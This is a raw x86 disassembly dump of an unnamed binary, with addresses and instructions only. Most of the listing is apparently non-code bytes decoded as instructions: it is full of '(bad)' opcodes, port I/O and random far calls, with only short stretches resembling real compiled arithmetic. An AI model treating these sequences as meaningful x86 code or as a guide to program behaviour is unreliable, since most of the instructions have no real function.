  4104f1:	sub    DWORD PTR [esi+0x3f48dd05],edi
  4104f7:	mov    al,0x8a
  4104f9:	repnz dec eax
  4104fb:	mov    al,ds:0x3cf331e
  410500:	push   cs
  410501:	xchg   edi,eax
  410502:	int3   
  410503:	icebp  
  410504:	push   cs
  410505:	xchg   esp,eax
  410506:	cmp    eax,0xcb4602c
  41050b:	lds    ebx,FWORD PTR [ebx-0x66]
  41050e:	scas   al,BYTE PTR es:[edi]
  41050f:	pusha  
  410510:	xchg   ecx,eax
  410511:	(bad)  
  410512:	push   esi
  410513:	mov    bh,0x97
  410515:	lods   eax,DWORD PTR ds:[esi]
  410516:	mov    ah,0xa6
  410518:	adc    al,0x60
  41051a:	ds aas 
  41051c:	add    ebx,esi
  41051e:	xor    BYTE PTR [ebx+0x4e],0xd2
  410522:	pusha  
  410523:	xor    al,0xb1
  410525:	mov    eax,ds:0xc18f3cb0
  41052a:	fisub  WORD PTR [ebx+0xc]
  41052d:	push   cs
  41052e:	mov    ah,0xed
  410530:	jns    0x410522
  410532:	outs   dx,DWORD PTR ds:[esi]
  410533:	je     0x4104f9
  410535:	ins    BYTE PTR es:[edi],dx
  410536:	xchg   esi,eax
  410537:	enter  0xb4bd,0xb
  41053b:	neg    esi
  41053d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41053e:	(bad)  
  41053f:	jecxz  0x4105a2
  410541:	add    DWORD PTR [esi],esi
  410543:	inc    edi
  410544:	popa   
  410545:	sub    BYTE PTR [eax-0xffad567],al
  41054b:	cs pop es
  41054d:	(bad)  
  41054f:	test   edx,eax
  410551:	fistp  DWORD PTR [ecx-0x1acae817]
  410557:	mov    BYTE PTR [edi],cl
  410559:	rcr    edx,1
  41055b:	or     BYTE PTR ds:[esi+0x540f5a75],ch
  410562:	mov    ss,ebx
  410564:	mov    eax,0xed7e237c
  410569:	xchg   ebx,esp
  41056b:	(bad)  
  41056c:	rcl    ebx,1
  41056e:	push   edi
  41056f:	ficom  DWORD PTR [edi+0x42936f12]
  410575:	dec    esi
  410576:	xlat   BYTE PTR ds:[ebx]
  410577:	adc    dh,BYTE PTR [esi-0x6e]
  41057a:	fidiv  WORD PTR [ebx+ecx*1]
  41057d:	hlt    
  41057e:	in     eax,0x26
  410580:	and    esp,ebx
  410582:	arpl   WORD PTR [edi],di
  410584:	cmp    al,0xd8
  410586:	in     al,0x6b
  410588:	push   cs
  410589:	pusha  
  41058a:	xlat   BYTE PTR ds:[ebx]
  41058b:	and    eax,0x6dc5b0aa
  410590:	in     al,0x83
  410592:	dec    esp
  410593:	pop    eax
  410594:	ret    
  410595:	add    bh,BYTE PTR [eax+0x77e16d16]
  41059b:	mov    bh,0x9d
  41059d:	test   DWORD PTR [ebp+0x48],edi
  4105a0:	xchg   esp,eax
  4105a1:	cld    
  4105a2:	mov    edi,0x7c2e6d0e
  4105a7:	retf   
  4105a8:	push   eax
  4105a9:	mov    ebp,0xbb25111b
  4105ae:	outs   dx,BYTE PTR ds:[esi]
  4105af:	dec    ebp
  4105b0:	add    dh,bl
  4105b2:	pop    ss
  4105b3:	rcr    BYTE PTR [ebx+0x29],cl
  4105b6:	mov    eax,0xae3919c7
  4105bb:	pushf  
  4105bc:	mov    edx,0x72e25fa2
  4105c1:	test   BYTE PTR [edx+0xb],ch
  4105c4:	out    0x81,al
  4105c6:	push   0xd3e65625
  4105cb:	add    DWORD PTR [ebx],0x89aec8a1
  4105d1:	loopne 0x41064a
  4105d3:	mov    fs,WORD PTR [ebp-0x36b9f635]
  4105d9:	stos   DWORD PTR es:[edi],eax
  4105da:	push   edi
  4105db:	or     dl,BYTE PTR [edx]
  4105dd:	call   0x5e3:0x406222af
  4105e4:	add    eax,0xab760042
  4105e9:	sub    eax,0x5d4b4a2a
  4105ee:	cld    
  4105ef:	mov    cl,0xdc
  4105f1:	sbb    al,0xec
  4105f3:	dec    ebx
  4105f4:	pop    DWORD PTR [edx]
  4105f6:	dec    esp
  4105f7:	xchg   ebx,eax
  4105f8:	push   esi
  4105f9:	fsubr  DWORD PTR ds:0xdd71154a
  4105ff:	mov    esi,DWORD PTR [ebx]
  410601:	sbb    ecx,DWORD PTR [ebx]
  410603:	mov    DWORD PTR [edx],0x60e76094
  410609:	sbb    esi,eax
  41060b:	xor    bl,ch
  41060d:	pop    esp
  41060e:	adc    al,0x90
  410610:	sub    dh,BYTE PTR [ebx-0x75]
  410613:	pop    ebp
  410614:	aam    0x8b
  410616:	dec    ebp
  410617:	or     al,0x3
  410619:	xor    DWORD PTR [ecx+0x79b577f2],eax
  41061f:	retf   
  410620:	shrd   edx,eax,0x2
  410624:	xor    ecx,ecx
  410626:	shl    esi,0x1e
  410629:	xor    ecx,edi
  41062b:	shr    eax,0x2
  41062e:	or     ecx,edx
  410630:	xor    esi,0x80000000
  410636:	or     esi,eax
  410638:	mov    DWORD PTR [ebp-0x40],ecx
  41063b:	push   edi
  41063c:	mov    DWORD PTR [ebp-0x3c],esi
  41063f:	mov    eax,DWORD PTR [ebp-0x48]
  410642:	mov    ecx,DWORD PTR [ebp-0x44]
  410645:	push   0xae0404d3
  41064a:	push   ecx
  41064b:	push   eax
  41064c:	call   0x422281
  410651:	mov    ecx,eax
  410653:	mov    eax,DWORD PTR [ebp-0x50]
  410656:	mov    esi,DWORD PTR [ebp-0x4c]
  410659:	or     ecx,eax
  41065b:	mov    eax,DWORD PTR [ebp-0x40]
  41065e:	or     edx,esi
  410660:	jmp    0x410a14
  410665:	pop    ebx
  410666:	icebp  
  410667:	lds    esp,FWORD PTR [eax+0x3abbbc68]
  41066d:	ror    ecx,0xfe
  410670:	fnstsw WORD PTR [ecx-0x106f6f03]
  410676:	cmp    al,0xbe
  410678:	mov    esi,0xbebec4e3
  41067d:	addr16 stc 
  41067f:	add    al,dl
  410681:	mov    cl,0xb1
  410683:	xchg   edi,eax
  410684:	(bad)  
  410685:	call   0xd43d32fc
  41068a:	psubsb mm4,QWORD PTR [ecx]
  41068d:	mov    ecx,0xa2fd935d
  410692:	sub    eax,0x1723c031
  410697:	das    
  410698:	push   esi
  410699:	push   es
  41069a:	ins    DWORD PTR es:[edi],dx
  41069b:	pop    ebp
  41069c:	sbb    BYTE PTR [ecx],cl
  41069e:	retf   
  41069f:	add    eax,0x1067ca6d
  4106a4:	ds pop ds
  4106a6:	out    dx,al
  4106a7:	cli    
  4106a8:	in     eax,0x86
  4106aa:	jecxz  0x4106ad
  4106ac:	mov    ?,WORD PTR [edx+ebx*4]
  4106af:	pop    edi
  4106b0:	cs jl  0x410723
  4106b3:	sbb    edi,edi
  4106b5:	fist   DWORD PTR [ecx]
  4106b7:	loope  0x410673
  4106b9:	popf   
  4106ba:	mov    esi,0x236711c3
  4106bf:	push   ds
  4106c0:	mov    eax,ds:0x3e2e13dc
  4106c5:	mov    ecx,0x85d18338
  4106ca:	cmp    DWORD PTR [eax+0x6c],0x94fec285
  4106d1:	popa   
  4106d2:	push   ss
  4106d3:	push   ecx
  4106d4:	sbb    DWORD PTR [esi-0x7],ebx
  4106d7:	lock and dl,BYTE PTR [edx]
  4106da:	outs   dx,DWORD PTR ds:[esi]
  4106db:	mov    cs,WORD PTR [edx-0x49]
  4106de:	sahf   
  4106df:	cmc    
  4106e0:	mov    dh,0xbd
  4106e2:	call   0x3232:0x7de3fe52
  4106e9:	mov    edi,0x3e1e784b
  4106ee:	test   eax,0xbd953f75
  4106f3:	test   DWORD PTR [ebx+0x3a45a93a],0x3b62b9c1
  4106fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4106fe:	jl     0x41069a
  410700:	rol    edi,0x8d
  410703:	call   0xae5d:0x287d85cb
  41070a:	ret    
  41070b:	inc    eax
  41070c:	mov    WORD PTR [ecx+0x30],cs
  41070f:	and    DWORD PTR [esp+edi*1+0x93fa9e7],esp
  410716:	mov    esi,0x5b91a632
  41071b:	jno    0x4106d5
  41071d:	enter  0x347,0x38
  410721:	fstp   TBYTE PTR [ecx+0x5d840aac]
  410727:	test   ebp,esi
  410729:	(bad)  
  41072a:	mov    esp,0x6983ff8e
  41072f:	fld    st(6)
  410731:	outs   dx,DWORD PTR ds:[esi]
  410732:	push   es
  410733:	xchg   BYTE PTR [edx-0x6a],dh
  410736:	repz clc 
  410738:	push   edx
  410739:	adc    BYTE PTR [esi+0x181456f0],bh
  41073f:	push   cs
  410740:	ss pop edi
  410742:	cmp    eax,0xcc4b9003
  410747:	mov    eax,0x8eb6636d
  41074c:	shl    DWORD PTR [edx+0x59],cl
  41074f:	or     dl,ch
  410751:	std    
  410752:	mov    al,0x7b
  410754:	dec    esp
  410755:	cmp    eax,0xe4842ced
  41075a:	jae    0x4106e7
  41075c:	aad    0x96
  41075e:	mov    edx,0x825b8d8f
  410763:	(bad)  
  410764:	jl     0x410776
  410766:	ror    bl,1
  410768:	push   ebp
  410769:	jne    0x4107e9
  41076b:	sub    DWORD PTR [esi+0x5],edx
  41076e:	jnp    0x41074f
  410770:	and    DWORD PTR [eax],edx
  410772:	add    eax,0xedbc2dd6
  410777:	xchg   edi,eax
  410778:	lahf   
  410779:	pop    edi
  41077a:	sbb    dh,ah
  41077c:	add    al,BYTE PTR [edx+0x4a17d26b]
  410782:	pushf  
  410783:	inc    esi
  410784:	ficomp WORD PTR [edx+0x7c7a6963]
  41078a:	add    ecx,edx
  41078c:	imul   esi,DWORD PTR [edx-0x26],0x1d
  410790:	aad    0x40
  410792:	pop    ebx
  410793:	sub    dl,dh
  410795:	add    DWORD PTR [ecx],edi
  410797:	push   ebx
  410798:	cdq    
  410799:	dec    eax
  41079a:	xor    al,0xaa
  41079c:	xchg   edi,eax
  41079d:	inc    ebp
  41079e:	arpl   WORD PTR [edx],bx
  4107a0:	leave  
  4107a1:	mov    BYTE PTR [edx+0x3f],al
  4107a4:	cmp    eax,0xa9c0b1a9
  4107a9:	test   DWORD PTR [ecx-0x5e],ecx
  4107ac:	or     esp,DWORD PTR [edi]
  4107ae:	jae    0x41075c
  4107b0:	xor    dl,BYTE PTR [esi-0x44]
  4107b3:	ins    BYTE PTR es:[edi],dx
  4107b4:	jns    0x410815
  4107b6:	add    ebp,edi
  4107b8:	outs   dx,BYTE PTR ds:[esi]
  4107b9:	out    0xa9,eax
  4107bb:	test   ebp,ebx
  4107bd:	pop    ebp
  4107be:	pop    esi
  4107bf:	and    al,0x84
  4107c1:	add    cl,BYTE PTR [ebx]
  4107c3:	push   0xab54c4b8
  4107c8:	jg     0x4107cd
  4107ca:	inc    ecx
  4107cb:	fdivr  QWORD PTR [ebx]
  4107cd:	sahf   
  4107ce:	mov    dl,0x9d
  4107d0:	in     eax,0x58
  4107d2:	out    dx,eax
  4107d3:	jbe    0x410814
  4107d5:	mov    WORD PTR [ebp-0x48db7210],fs
  4107db:	cmp    bl,BYTE PTR [esi+0x37db0af9]
  4107e1:	sub    al,0x5c
  4107e3:	inc    esp
  4107e4:	addr16 mov eax,ds:0x9f8
  4107e8:	mov    ds:0xe1702bb3,eax
  4107ed:	ins    DWORD PTR es:[edi],dx
  4107ee:	push   esi
  4107ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4107f0:	mov    edx,0xe05876f9
  4107f5:	pop    esp
  4107f6:	xor    al,0x21
  4107f8:	test   eax,0xa89668fb
  4107fd:	test   DWORD PTR [esi+0x482ebe33],0xf65288d8
  410807:	add    BYTE PTR [ecx+0x0],0x71
  41080b:	lods   al,BYTE PTR ds:[esi]
  41080c:	and    BYTE PTR [ebx],ch
  41080e:	dec    ebp
  41080f:	adc    esi,0x5158765
  410815:	or     bh,BYTE PTR [esi]
  410817:	leave  
  410818:	popf   
  410819:	aad    0x54
  41081b:	in     al,0xc3
  41081d:	pop    eax
  41081e:	or     ebx,DWORD PTR [ebx+0x7d]
  410821:	and    dh,cl
  410823:	rol    DWORD PTR [edx],1
  410825:	mov    ds:0xe2753e90,al
  41082a:	sbb    DWORD PTR [edi+ebp*2],ecx
  41082d:	aas    
  41082e:	ins    DWORD PTR es:[edi],dx
  41082f:	push   ds
  410830:	int3   
  410831:	sbb    ecx,ebp
  410833:	clc    
  410834:	jo     0x41081c
  410836:	std    
  410837:	cli    
  410838:	adc    eax,DWORD PTR [bx-0x2199]
  41083d:	pop    edi
  41083e:	repz iret 
  410840:	dec    ebp
  410841:	clc    
  410842:	out    dx,eax
  410843:	mov    edi,0xa976329a
  410848:	scas   eax,DWORD PTR es:[edi]
  410849:	out    0x34,al
  41084b:	test   BYTE PTR [esi],ah
  41084d:	and    esi,eax
  41084f:	in     eax,dx
  410850:	and    eax,0x8af6d392
  410855:	daa    
  410856:	xchg   esp,eax
  410857:	cmp    BYTE PTR [edi+0x233dbc73],bl
  41085d:	add    dh,BYTE PTR [edi]
  41085f:	jbe    0x410867
  410861:	cli    
  410862:	jge    0x41080c
  410864:	pop    ebp
  410865:	stc    
  410866:	nop
  410867:	dec    esi
  410868:	fadd   st(1),st
  41086a:	je     0x4108da
  41086c:	sub    al,0xc1
  41086e:	and    BYTE PTR [esi-0x27b210fa],dh
  410874:	mov    ss,WORD PTR [ebx+0x24]
  410877:	sar    DWORD PTR [edx+0x622be8b3],cl
  41087d:	jmp    0x41080d
  41087f:	inc    ecx
  410880:	stos   BYTE PTR es:[edi],al
  410881:	and    eax,0x384de329
  410886:	mov    ebx,0xdfbb1031
  41088b:	ja     0x41087e
  41088d:	adc    al,0x7a
  41088f:	add    esp,DWORD PTR [esi+eax*1]
  410892:	pusha  
  410893:	push   eax
  410894:	sub    al,0x70
  410896:	aad    0x73
  410898:	rol    dh,0x99
  41089b:	imul   ebx,ecx,0xffffffa9
  41089e:	test   DWORD PTR [esi],0xbdd2e987
  4108a4:	lods   al,BYTE PTR ds:[esi]
  4108a5:	and    esi,DWORD PTR [esi-0x7b]
  4108a8:	mov    WORD PTR [ebx-0x70],fs
  4108ab:	sub    al,0x3b
  4108ad:	mov    WORD PTR ds:0x86e8b217,es
  4108b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4108b4:	ficom  WORD PTR [ecx+0xd]
  4108b8:	in     eax,0xa7
  4108ba:	adc    al,0x52
  4108bc:	outs   dx,DWORD PTR ds:[esi]
  4108bd:	xlat   BYTE PTR ds:[ebx]
  4108be:	mov    WORD PTR [eax+0x1c02a44],es
  4108c4:	cmp    al,0x58
  4108c6:	xchg   dh,dl
  4108c8:	les    esp,FWORD PTR [ebp+0x1c382d7a]
  4108ce:	cmp    DWORD PTR [ebp-0x3218e15e],edi
  4108d4:	popf   
  4108d5:	add    BYTE PTR [edx+0x1e61f700],0x79
  4108dc:	or     al,0x42
  4108de:	sub    dl,BYTE PTR [eax+0x2]
  4108e1:	mov    ebp,0x741e6c50
  4108e6:	ds fdivp st(2),st
  4108e9:	cmp    cl,BYTE PTR [ebp-0x16]
  4108ec:	sahf   
  4108ed:	pop    edx
  4108ee:	xchg   esp,esp
  4108f0:	dec    eax
  4108f1:	imul   esi,DWORD PTR [ebp+edi*4-0x7b],0xffffff85
  4108f6:	lahf   
  4108f7:	push   ss
  4108f8:	add    edi,edi
  4108fa:	js     0x410970
  4108fc:	cmp    al,0x2e
  4108fe:	dec    ebp
  4108ff:	cwde   
  410900:	pop    ebp
  410901:	push   eax
  410902:	xchg   bh,ch
  410904:	and    al,0x31
  410906:	inc    esp
  410907:	sbb    DWORD PTR [esi+0x20],ebx
  41090a:	inc    esi
  41090b:	(bad)  
  41090c:	and    DWORD PTR [edx],ecx
  41090e:	adc    bl,BYTE PTR [ecx]
  410910:	into   
  410911:	stos   DWORD PTR es:[edi],eax
  410912:	sbb    al,0x93
  410914:	aad    0xe
  410916:	sti    
  410917:	push   ecx
  410918:	jnp    0x410988
  41091a:	dec    esp
  41091b:	sbb    esi,DWORD PTR [ecx]
  41091d:	sar    DWORD PTR [ecx+0x18],0x5a
  410921:	dec    edi
  410922:	sub    eax,0x3a344f86
  410927:	xor    al,0x9b
  410929:	sbb    eax,0x3769e82
  41092e:	jne    0x410985
  410930:	and    bh,BYTE PTR [esi+esi*4-0x4d]
  410934:	ror    BYTE PTR [ebx],0x3c
  410937:	scas   al,BYTE PTR es:[edi]
  410938:	(bad)  
  410939:	jle    0x4109a9
  41093b:	(bad)  
  41093c:	in     eax,0xff
  41093e:	aas    
  41093f:	sub    ebp,DWORD PTR [ecx-0x22]
  410942:	push   esi
  410943:	lods   al,BYTE PTR ds:[esi]
  410944:	or     DWORD PTR [eax],esi
  410946:	scas   al,BYTE PTR es:[edi]
  410947:	retf   
  410948:	xor    DWORD PTR [ecx-0x364c9585],0x4e928d5f
  410952:	inc    edi
  410953:	mov    bl,0x1
  410955:	lock iret 
  410957:	xchg   ebx,eax
  410958:	daa    
  410959:	mov    dh,0x84
  41095b:	dec    edi
  41095c:	cs mov ah,0x9
  41095f:	and    al,0x4c
  410961:	lock call 0x941c697b
  410967:	or     ebp,edi
  410969:	mov    ds:0x71784893,eax
  41096e:	out    dx,eax
  41096f:	mov    ah,0x7
  410971:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410972:	scas   al,BYTE PTR es:[edi]
  410973:	mov    dh,0xd4
  410975:	call   0x5ccc:0x7d90c3ae
  41097c:	xchg   ebx,eax
  41097d:	ror    ch,cl
  41097f:	mov    ds:0x3d77431e,al
  410984:	jge    0x410912
  410986:	dec    esp
  410987:	aas    
  410988:	fild   DWORD PTR [edx-0x23e7636c]
  41098e:	mov    cl,0x1b
  410990:	scas   eax,DWORD PTR es:[edi]
  410991:	icebp  
  410992:	int3   
  410993:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410994:	sbb    eax,0x90f43b91
  410999:	pop    ecx
  41099a:	(bad)  
  41099b:	cdq    
  41099c:	push   0xc6f8cd7b
  4109a1:	dec    ebx
  4109a2:	es push es
  4109a4:	ds mov edi,0xfc2bf5ab
  4109aa:	es push eax
  4109ac:	test   eax,0x6ee0e620
  4109b1:	dec    edi
  4109b2:	in     al,dx
  4109b3:	fstp   QWORD PTR [eax+0x8d3ce2d]
  4109b9:	fwait
  4109ba:	adc    esp,edi
  4109bc:	leave  
  4109bd:	pop    edx
  4109be:	arpl   WORD PTR [edi-0x74],cx
  4109c1:	sub    BYTE PTR [esi-0x33],ah
  4109c4:	int    0x37
  4109c6:	nop
  4109c7:	bound  ebx,QWORD PTR [esp+edi*8+0x14107362]
  4109ce:	test   BYTE PTR [ebp+0x33],bl
  4109d1:	jns    0x410a08
  4109d3:	fwait
  4109d4:	push   edi
  4109d5:	scas   eax,DWORD PTR es:[edi]
  4109d6:	pop    esp
  4109d7:	push   ebx
  4109d8:	dec    ebp
  4109d9:	cmc    
  4109da:	pop    ebp
  4109db:	sbb    BYTE PTR [edx],cl
  4109dd:	jmp    0x4a2fc1b1
  4109e2:	jle    0x410985
  4109e4:	sbb    bl,dh
  4109e6:	in     eax,0xc
  4109e8:	adc    ch,BYTE PTR [ebp+0x22]
  4109eb:	adc    BYTE PTR [esi],bl
  4109ed:	mov    bl,0x0
  4109ef:	and    BYTE PTR [esi],ah
  4109f1:	adc    bh,cl
  4109f3:	lods   al,BYTE PTR ds:[esi]
  4109f4:	jnp    0x410999
  4109f6:	add    bl,ch
  4109f8:	push   0xb52bbd76
  4109fd:	cdq    
  4109fe:	jle    0x410a7c
  410a00:	inc    edi
  410a01:	xor    eax,0xc295a9ee
  410a06:	loop   0x4109a7
  410a08:	add    BYTE PTR [ebx-0x68fd0fd0],0x6d
  410a0f:	(bad)  
  410a10:	mov    WORD PTR [edi],ds
  410a12:	test   eax,0xc4758bf6
  410a17:	add    ecx,eax
  410a19:	mov    eax,DWORD PTR [ebp-0x58]
  410a1c:	adc    edx,esi
  410a1e:	mov    esi,DWORD PTR [ebp-0x54]
  410a21:	add    ecx,eax
  410a23:	mov    eax,DWORD PTR [ebp+0x8]
  410a26:	adc    edx,esi
  410a28:	add    ecx,0xffff55a8
  410a2e:	pop    edi
  410a2f:	adc    edx,0xffff64cd
  410a35:	pop    esi
  410a36:	mov    DWORD PTR [eax],ecx
  410a38:	jmp    0x410dec
  410a3d:	pop    esi
  410a3e:	sub    al,0xdf
  410a40:	shr    BYTE PTR [ebx+ebx*1+0x359fbc6e],1
  410a47:	mov    esp,0x9c5588a4
  410a4c:	jecxz  0x410a64
  410a4e:	inc    edx
  410a4f:	mov    esi,0xbec4e3be
  410a54:	mov    esi,0x9234162d
  410a59:	jo     0x4109eb
  410a5b:	or     DWORD PTR [eax+0x35dc6992],ebp
  410a61:	jge    0x410ac1
  410a63:	sub    DWORD PTR [edx],eax
  410a65:	mov    eax,edi
  410a67:	mov    eax,ds:0x1649de74
  410a6c:	out    0x9f,al
  410a6e:	dec    eax
  410a6f:	nop
  410a70:	psllw  mm7,QWORD PTR [ebx]
  410a73:	adc    BYTE PTR [eax-0x6dcf4915],ch
  410a79:	repz cmp dh,al
  410a7c:	iret   
  410a7d:	and    eax,0x7d19df95
  410a82:	jmp    0x3b8b:0x26c87e10
  410a89:	dec    eax
  410a8a:	xor    eax,0x1c3e051
  410a8f:	pop    eax
  410a90:	pop    es
  410a91:	push   es
  410a92:	mov    al,0x55
  410a94:	scas   eax,DWORD PTR es:[edi]
  410a95:	mov    esi,0x672353d9
  410a9a:	xlat   BYTE PTR ds:[ebx]
  410a9b:	int3   
  410a9c:	pop    es
  410a9d:	xor    dh,BYTE PTR [edx+0x22]
  410aa0:	mov    bl,0x48
  410aa2:	aas    
  410aa3:	adc    edx,edx
  410aa5:	mov    BYTE PTR [ebp-0x6f3cea27],ch
  410aab:	lock xor DWORD PTR [edi-0x6],esi
  410aaf:	mov    DWORD PTR [ecx+esi*8-0x3589b685],edi
  410ab6:	cld    
  410ab7:	pop    ecx
  410ab8:	dec    ecx
  410ab9:	fdiv   QWORD PTR [esi+0x21]
  410abc:	imul   BYTE PTR [esi+0x402dd043]
  410ac2:	adc    eax,0xddaceef3
  410ac7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ac8:	jmp    0x94353fa4
  410acd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ace:	or     ebx,ebx
  410ad0:	pop    ecx
  410ad1:	pop    esp
  410ad2:	inc    edx
  410ad3:	jbe    0x410b3b
  410ad5:	aad    0x90
  410ad7:	mov    esi,0xea759493
  410adc:	push   edi
  410add:	shr    ch,0x38
  410ae0:	push   ecx
  410ae1:	pushf  
  410ae2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ae3:	iret   
  410ae4:	mov    ds:0x65280c7a,al
  410ae9:	xor    eax,0xfde54015
  410aee:	push   ecx
  410aef:	aad    0x45
  410af1:	add    BYTE PTR [esi+ebp*4],0x7a
  410af5:	int3   
  410af6:	div    esi
  410af8:	push   esp
  410af9:	sti    
  410afa:	loopne 0x410afb
  410afc:	mov    ch,0x1d
  410afe:	out    0xf,al
  410b00:	pop    esi
  410b01:	js     0x410a9d
  410b03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b04:	cmp    edi,eax
  410b06:	(bad)  
  410b08:	add    eax,0x65fb3f8c
  410b0d:	jg     0x410ac9
  410b0f:	das    
  410b10:	lock ja 0x410b47
  410b13:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b15:	jno    0x410b71
  410b17:	ins    DWORD PTR es:[edi],dx
  410b18:	push   esi
  410b19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b1b:	scas   al,BYTE PTR es:[edi]
  410b1c:	xchg   WORD PTR [ecx],bx
  410b1f:	sti    
  410b20:	mov    al,ds:0x67450adb
  410b25:	cmp    DWORD PTR [edi],edi
  410b27:	add    ah,bl
  410b29:	(bad)  
  410b2b:	cld    
  410b2c:	pop    ecx
  410b2d:	rcr    BYTE PTR ds:0x20761337,1
  410b33:	jnp    0x410b26
  410b35:	je     0x410b0d
  410b37:	mov    cl,0x36
  410b39:	inc    ebx
  410b3a:	push   esi
  410b3b:	cmp    esp,DWORD PTR [ebx+0x59]
  410b3e:	cmp    edi,DWORD PTR [esi]
  410b40:	and    BYTE PTR [ecx-0x45],bh
  410b43:	adc    eax,0xe86e3c5a
  410b48:	xor    bh,BYTE PTR [ebx+0x16]
  410b4b:	or     bl,ah
  410b4d:	or     eax,0xbf20c5f2
  410b52:	sub    ah,BYTE PTR [esi-0x48]
  410b55:	mov    dl,0xb3
  410b57:	dec    edi
  410b58:	(bad)  
  410b5a:	jno    0x410b4d
  410b5c:	scas   eax,DWORD PTR es:[edi]
  410b5d:	int    0x56
  410b5f:	add    eax,0xe49b875e
  410b64:	jae    0x410aef
  410b66:	add    eax,0xede68bd9
  410b6b:	jp     0x410be3
  410b6d:	mov    dl,0xc3
  410b6f:	retf   
  410b70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b71:	imul   edx,ecx,0xea4259ff
  410b77:	ss js  0x410b87
  410b7a:	push   0xffd7d308
  410b7f:	mov    ah,BYTE PTR [ecx+0x7b8c75a9]
  410b85:	sar    BYTE PTR [edx-0x32],cl
  410b88:	(bad)  
  410b89:	xchg   DWORD PTR [edx+0x66ea4a63],esi
  410b8f:	mov    dl,0x7d
  410b91:	mov    bh,0xa9
  410b93:	lea    ebp,[ecx]
  410b95:	sbb    al,0xd7
  410b97:	jbe    0x410b1b
  410b99:	aas    
  410b9a:	mov    bh,0x7
  410b9c:	xor    edx,DWORD PTR [edi-0x2c86b0da]
  410ba2:	mov    ecx,0x1a841efa
  410ba7:	sub    dh,BYTE PTR [ecx]
  410ba9:	(bad)  
  410baa:	sbb    DWORD PTR [edi-0x75],edx
  410bad:	lods   eax,DWORD PTR fs:[esi]
  410baf:	mov    edx,0x1c95d5ae
  410bb4:	add    al,dl
  410bb6:	mov    ecx,0x3b0049df
  410bbb:	out    0xed,al
  410bbd:	ret    
  410bbe:	add    BYTE PTR [edx],bl
  410bc0:	sub    DWORD PTR [edi],edi
  410bc2:	in     al,0xb3
  410bc4:	mov    edx,DWORD PTR [edx+edi*8+0x10]
  410bc8:	inc    eax
  410bc9:	xchg   ebx,eax
  410bca:	test   DWORD PTR [edx],0x4daba2e1
  410bd0:	ret    0x756
  410bd3:	xor    bh,BYTE PTR [ebx+ebp*8]
  410bd6:	jmp    0x410c30
  410bd8:	mov    bh,0xcc
  410bda:	adc    al,0xda
  410bdc:	mov    ah,0x67
  410bde:	and    dh,BYTE PTR [eax]
  410be0:	data16 cld 
  410be2:	jb     0x410ba0
  410be4:	(bad)  
  410be5:	movhlps xmm5,xmm2
  410be8:	lea    esi,[ebx]
  410bea:	xor    eax,0x3ce06a05
  410bef:	and    BYTE PTR [esi+ebp*1+0x11af7fc3],ah
  410bf6:	sbb    al,0x9d
  410bf8:	leave  
  410bf9:	clc    
  410bfa:	dec    ecx
  410bfb:	xor    BYTE PTR [esi+ebp*2-0x2fe721aa],0xab
  410c03:	jge    0x410b9e
  410c05:	jnp    0x410c34
  410c07:	mov    dl,0x80
  410c09:	push   eax
  410c0a:	nop
  410c0b:	cmc    
  410c0c:	dec    ebp
  410c0d:	xlat   BYTE PTR ds:[ebx]
  410c0e:	sahf   
  410c0f:	pop    edx
  410c10:	cmp    BYTE PTR [edi-0x1b],al
  410c13:	or     esp,DWORD PTR [eax]
  410c15:	mov    esi,0x7ba259f
  410c1a:	pop    ss
  410c1b:	out    dx,al
  410c1c:	das    
  410c1d:	fcom   DWORD PTR [ecx]
  410c1f:	pop    es
  410c20:	out    dx,al
  410c21:	ror    BYTE PTR [ebp+0x1f6d96c6],0xf2
  410c28:	mov    ds:0x92785ece,eax
  410c2d:	daa    
  410c2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c2f:	dec    esi
  410c30:	lods   eax,DWORD PTR ds:[esi]
  410c31:	sub    dl,BYTE PTR [ebx-0x50]
  410c34:	imul   DWORD PTR [edx]
  410c36:	cmp    edi,eax
  410c38:	xchg   DWORD PTR [esi+edi*2-0x4632947e],eax
  410c3f:	or     BYTE PTR [edx-0x752a2863],ah
  410c45:	mov    bl,bh
  410c47:	mov    ch,dl
  410c49:	push   0x6797773a
  410c4e:	push   cs
  410c4f:	mov    gs,ebx
  410c51:	scas   al,BYTE PTR es:[edi]
  410c52:	mov    al,0xe2
  410c54:	stos   DWORD PTR es:[edi],eax
  410c55:	or     bh,bh
  410c57:	(bad)  
  410c59:	ret    0x91fb
  410c5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c5d:	xor    ah,dh
  410c5f:	hlt    
  410c60:	jbe    0x410c0d
  410c62:	outs   dx,BYTE PTR ds:[esi]
  410c63:	cmove  eax,DWORD PTR [ecx+0x6f6adda3]
  410c6a:	pop    ds
  410c6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c6c:	jns    0x410c4f
  410c6e:	arpl   WORD PTR [eax+ebp*4],cx
  410c71:	sti    
  410c72:	repz add al,0x35
  410c75:	jp     0x410c4d
  410c77:	loope  0x410c7c
  410c79:	not    DWORD PTR fs:[edx+0x399d6227]
  410c80:	aam    0xf
  410c82:	adc    eax,edx
  410c84:	int3   
  410c85:	rcl    DWORD PTR [eax+0x640727c6],1
  410c8b:	mov    eax,ds:0x5498f21
  410c90:	pop    ecx
  410c91:	outs   dx,DWORD PTR ds:[esi]
  410c92:	fwait
  410c93:	ret    
  410c94:	daa    
  410c95:	sub    eax,0xdb67f67a
  410c9a:	test   al,cl
  410c9c:	cmc    
  410c9d:	sub    cl,bl
  410c9f:	lock add dl,BYTE PTR [eax]
  410ca2:	out    0xb9,al
  410ca4:	jb     0x410d22
